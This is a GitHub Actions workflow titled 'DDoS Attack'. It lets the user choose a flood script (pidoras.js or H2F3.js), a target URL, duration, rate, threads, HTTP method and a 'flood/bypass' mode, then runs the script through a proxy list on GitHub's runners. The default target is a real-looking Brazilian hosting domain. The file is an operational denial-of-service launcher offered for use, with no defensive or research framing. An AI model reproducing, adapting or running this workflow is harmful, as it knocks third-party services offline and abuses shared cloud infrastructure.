name: DDoS Attack

on:
  workflow_dispatch:
    inputs:
      script:
        description: 'Script to run'
        required: true
        default: 'pidoras.js'
        type: choice
        options:
          - pidoras.js
          - H2F3.js
      target:
        description: 'Target URL'
        required: true
        default: 'https://lordehost.com.br/'
      time:
        description: 'Time (seconds)'
        required: true
        default: '60'
      rate:
        description: 'Rate'
        required: true
        default: '10'
      threads:
        description: 'Threads'
        required: true
        default: '4'
      method:
        description: 'Method (GET/POST)'
        required: true
        default: 'GET'
      mode:
        description: 'Mode (flood/bypass)'
        required: true
        default: 'flood'

jobs:
  attack:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
    
    - name: Install dependencies
      run: |
        npm install net http2 tls cluster os url crypto dns fs colors
    
    - name: Run attack
      run: |
        echo "Script: ${{ github.event.inputs.script }}"
        echo "Target: ${{ github.event.inputs.target }}"
        echo "Time: ${{ github.event.inputs.time }}s"
        echo "Rate: ${{ github.event.inputs.rate }}"
        echo "Threads: ${{ github.event.inputs.threads }}"
        
        if [ "${{ github.event.inputs.script }}" == "pidoras.js" ]; then
          node pidoras.js ${{ github.event.inputs.target }} ${{ github.event.inputs.time }} ${{ github.event.inputs.rate }} ${{ github.event.inputs.threads }} proxy.txt
        else
          node H2F3.js ${{ github.event.inputs.target }} ${{ github.event.inputs.time }} ${{ github.event.inputs.rate }} ${{ github.event.inputs.threads }} proxy.txt ${{ github.event.inputs.method }} ${{ github.event.inputs.mode }}
        fi
    
    - name: Show result
      run: |
        echo "Ataque finalizado!"
        date
